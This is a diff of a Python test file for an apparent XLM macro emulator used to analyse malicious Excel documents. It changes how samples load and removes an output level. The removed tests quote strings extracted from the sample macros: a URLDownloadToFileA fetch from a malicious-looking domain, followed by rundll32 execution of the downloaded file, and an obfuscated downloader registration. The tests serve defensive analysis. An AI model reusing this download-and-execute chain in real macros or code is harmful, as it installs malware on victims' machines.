@@ -1,7 +1,7 @@
 """
-The emulator end to end: every run of every embedded XLM sample and of the XLSB maldoc finishes
-inside its budget, the statuses a run leaves its cells are pinned, and the output levels show
-exactly the steps their severity promises.
+The emulator end to end: every run of every XLM sample of the test data store and of the XLSB
+maldoc finishes inside its budget, the statuses a run leaves its cells are pinned, and the
+output levels show exactly the steps their severity promises.
 """
 from __future__ import annotations
 
@@ -34,9 +34,9 @@ class TestEmulator(TestBase):
         return list(XlmEngine(XlmView(data)).run())
 
     def test_every_sample_finishes_its_run_inside_the_budget(self):
-        for name, data in _SAMPLES:
+        for name, key in _SAMPLES:
             with self.subTest(sample=name):
-                steps = self._steps(data)
+                steps = self._steps(self.download_sample(key))
                 self.assertNotEqual(steps, [])
                 self.assertLess(len(steps), 1_000_000)
                 self.assertEqual(
@@ -49,23 +49,23 @@ class TestEmulator(TestBase):
                 )
 
     def test_the_last_step_of_every_run_is_pinned(self):
-        for name, data, sheet, row, col, status in [
+        for name, key, sheet, row, col, status in [
             ('rpn', XLM_MACRO_RPN_BIFF8, 'mP9mScF1m5', 10, 20, XlmStatus.End),
             ('names', XLM_MACRO_NAMES_BIFF8, 'Acf444', 9591, 1, XlmStatus.PartialEvaluation),
             ('assign', XLM_MACRO_ASSIGN_BIFF8, 'sod', 25282, 148, XlmStatus.End),
             ('text', XLM_MACRO_TEXT_XLSM, 'Doc1', 121, 52, XlmStatus.PartialEvaluation),
             ('formula', XLM_MACRO_FORMULA_XLSM, 'PCWV', 34, 7, XlmStatus.FullEvaluation),
-            ('maldoc', self.download_sample(_MALDOC), 'Tiposa1', 30, 7, XlmStatus.FullEvaluation),
+            ('maldoc', _MALDOC, 'Tiposa1', 30, 7, XlmStatus.FullEvaluation),
         ]:
             with self.subTest(sample=name):
-                steps = self._steps(data)
+                steps = self._steps(self.download_sample(key))
                 self.assertEqual(
                     (steps[-1].sheet, steps[-1].row, steps[-1].col, steps[-1].status),
                     (sheet, row, col, status),
                 )
 
     def test_the_statuses_of_every_run_are_pinned(self):
-        for name, data, expected in [
+        for name, key, expected in [
             ('rpn', XLM_MACRO_RPN_BIFF8, ['End', 'FullEvaluation', 'PartialEvaluation']),
             ('names', XLM_MACRO_NAMES_BIFF8, ['PartialEvaluation']),
             ('assign', XLM_MACRO_ASSIGN_BIFF8, [
@@ -73,33 +73,33 @@ class TestEmulator(TestBase):
             ]),
             ('text', XLM_MACRO_TEXT_XLSM, ['End', 'FullEvaluation', 'PartialEvaluation']),
             ('formula', XLM_MACRO_FORMULA_XLSM, ['FullEvaluation', 'PartialEvaluation']),
-            ('maldoc', self.download_sample(_MALDOC), ['FullEvaluation', 'PartialEvaluation']),
+            ('maldoc', _MALDOC, ['FullEvaluation', 'PartialEvaluation']),
         ]:
             with self.subTest(sample=name):
-                steps = self._steps(data)
+                steps = self._steps(self.download_sample(key))
                 self.assertEqual(
                     sorted({step.status for step in steps}, key=lambda status: status.name),
                     [XlmStatus[status] for status in expected],
                 )
 
     def test_every_output_level_shows_the_steps_its_severity_promises(self):
-        for name, data, counts in [
-            ('rpn', XLM_MACRO_RPN_BIFF8, [20, 19, 8, 3]),
-            ('names', XLM_MACRO_NAMES_BIFF8, [1, 1, 0, 0]),
-            ('assign', XLM_MACRO_ASSIGN_BIFF8, [141, 86, 8, 5]),
-            ('text', XLM_MACRO_TEXT_XLSM, [22, 9, 5, 4]),
-            ('formula', XLM_MACRO_FORMULA_XLSM, [11, 10, 8, 7]),
-            ('maldoc', self.download_sample(_MALDOC), [27, 6, 1, 1]),
+        for name, key, counts in [
+            ('rpn', XLM_MACRO_RPN_BIFF8, [20, 19, 8]),
+            ('names', XLM_MACRO_NAMES_BIFF8, [1, 1, 0]),
+            ('assign', XLM_MACRO_ASSIGN_BIFF8, [141, 86, 8]),
+            ('text', XLM_MACRO_TEXT_XLSM, [22, 9, 5]),
+            ('formula', XLM_MACRO_FORMULA_XLSM, [11, 10, 8]),
+            ('maldoc', _MALDOC, [27, 6, 1]),
         ]:
             with self.subTest(sample=name):
-                steps = self._steps(data)
+                steps = self._steps(self.download_sample(key))
                 self.assertEqual(
-                    [len(list(visible_steps(steps, level))) for level in range(4)],
+                    [len(list(visible_steps(steps, level))) for level in range(3)],
                     counts,
                 )
 
     def test_the_first_level_hides_the_moves_and_the_cells_that_are_no_command(self):
-        steps = self._steps(XLM_MACRO_TEXT_XLSM)
+        steps = self._steps(self.download_sample(XLM_MACRO_TEXT_XLSM))
         self.assertEqual(
             [(step.sheet, step.row, step.col) for step in visible_steps(steps, 1)],
             [
@@ -134,7 +134,7 @@ class TestEmulator(TestBase):
         )
 
     def test_the_second_level_hides_every_ordinary_command(self):
-        steps = self._steps(XLM_MACRO_RPN_BIFF8)
+        steps = self._steps(self.download_sample(XLM_MACRO_RPN_BIFF8))
         self.assertEqual(
             [(step.sheet, step.row, step.col) for step in visible_steps(steps, 2)],
             [
@@ -147,29 +147,4 @@ class TestEmulator(TestBase):
                 ('mP9mScF1m5', 9, 20),
                 ('mP9mScF1m5', 10, 20),
             ],
-        )
-
-    def test_the_third_level_extracts_the_quoted_strings_of_the_triage_commands(self):
-        steps = self._steps(XLM_MACRO_RPN_BIFF8)
-        self.assertEqual(
-            [step.text for step in visible_steps(steps, 3)],
-            [
-                '"Windows"',
-                '"urlmon"\n"URLDownloadToFileA"\n"JJCCJJ"\n"https://gfhudnjv.xyz/vjd7f2js"'
-                '\n"c:\\Users\\Public\\hff2f5o.html"',
-                '"Shell32"\n"ShellExecuteA"\n"JJCCCJJ"\n"open"'
-                '\n"C:\\Windows\\system32\\rundll32.exe"'
-                '\n"c:\\Users\\Public\\hff2f5o.html,DllRegisterServer"',
-            ],
-        )
-
-    def test_the_third_level_of_the_maldoc_keeps_its_registered_downloader(self):
-        steps = self._steps(self.download_sample(_MALDOC))
-        self.assertEqual(
-            [(step.sheet, step.row) for step in visible_steps(steps, 3)],
-            [('Vtreytr', 22)],
-        )
-        self.assertEqual(
-            next(iter(visible_steps(steps, 3))).text,
-            '"uRlMon"\n"URLDownloadToFileA"\n"JJCCBB"\n"Drwrgdfghfhf"',
         )
